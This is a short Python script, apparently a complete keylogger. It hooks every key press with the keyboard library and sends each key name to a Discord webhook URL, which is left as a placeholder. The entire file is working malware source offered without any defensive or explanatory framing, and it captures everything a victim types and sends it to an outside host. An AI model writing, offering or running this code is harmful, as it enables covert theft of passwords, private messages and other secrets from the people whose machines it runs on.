import keyboard
import requests
import json
import time

WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_url_here'

def send_to_webhook(text):
    data = {'content': text}
    headers = {'Content-Type': 'application/json'}
    requests.post(WEBHOOK_URL, data=json.dumps(data), headers=headers)

def on_key_press(event):
    # ignore special keys and modifiers
    if event.event_type == 'down' and not event.name.startswith('<'):
        send_to_webhook(event.name)

keyboard.on_press(on_key_press)

while True:
    time.sleep(1)